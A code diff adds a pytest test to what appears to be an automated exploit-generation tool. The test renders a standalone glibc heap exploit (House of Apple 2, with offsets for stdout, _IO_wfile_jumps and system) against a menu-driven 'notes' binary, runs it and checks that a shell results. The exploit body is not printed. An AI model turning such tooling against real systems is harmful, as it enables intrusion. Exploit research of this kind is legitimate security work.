@@ -93,3 +93,21 @@ def test_heap_strategy_stage_confirms_l3(store, case, notes_bin):
                    for pc in PocDAO(store.conn).list_by_target(t.id))
     finally:
         pool.stop(grace=3.0)
+
+
+def test_render_heap_script_reproduces_shell(notes_bin, tmp_path):
+    """The bundled standalone reproducer (render_heap_script) re-drives the notes menu to a shell
+    on its own -- no lykos imports -- proving the L3 bundle is self-reproducing."""
+    import subprocess as sp
+    off = heap.unsorted_bin_offset()
+    if off is None:
+        pytest.skip("no compiler/setarch to derive the arena offset")
+    ld = open(_SYS_LIBC, "rb").read()
+    T = heap.house_of_apple2_targets(ld)
+    ops = {"add": "1\n{idx}\n{size}\n{data}", "free": "2\n{idx}\n", "view": "3\n{idx}\n",
+           "edit": "4\n{idx}\n{data}", "exit_seq": "5\n"}
+    script = leak.render_heap_script(menu_ops=ops, unsorted_off=off, stdout_off=T["stdout"],
+                                     wfile_jumps_off=T["wfile_jumps"], system_off=T["system"])
+    sf = tmp_path / "exploit.py"; sf.write_bytes(script)
+    r = sp.run(["python3", str(sf), str(notes_bin)], capture_output=True, timeout=60)
+    assert r.returncode == 0 and b"uid=" in r.stdout, (r.stdout[:200], r.stderr[:200])
